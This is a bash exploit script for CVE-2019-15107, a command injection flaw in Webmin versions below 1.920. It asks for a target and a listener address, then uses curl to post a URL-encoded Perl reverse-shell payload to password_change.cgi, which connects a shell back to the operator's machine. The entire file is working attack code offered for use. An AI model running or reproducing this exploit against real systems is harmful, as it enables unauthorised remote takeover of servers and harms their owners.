#!/bin/bash

# CVE-2019-15107: Webmin < 1.920 - Command Injection
# by g1vi https://github.com/g1vi
# March 2023

read -p "[+] Enter target ip: " target
read -p "[+] Enter target port: " port
read -p "[+] Start a listener and enter the used port here: " bindport
read -p "[+] Enter the interface where the listener is running: " interface

echo -e "\n[+] Processing stuff..."
sleep 1
localip=$(ifconfig $interface | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')
payload="user=gotroot&pam=&expired=2|perl%20%2De%20%27use%20Socket%3B%24i%3D%22${localip}%22%3B%24p%3D${bindport}%3Bsocket%28S%2CPF%5FINET%2CSOCK%5FSTREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr%5Fin%28%24p%2Cinet%5Faton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22sh%20%2Di%22%29%3B%7D%3B%27"
header="Referer: https://${target}:${port}/session_login.cgi"

echo -e "\n[+] Sending stuff..."
sleep 1

echo -e "\n[+] A revshell is opened elsewhere"
echo -e "[+] Check your listener"

curl --silent -k https://$target:$port/password_change.cgi -d "$payload" -H "$header"
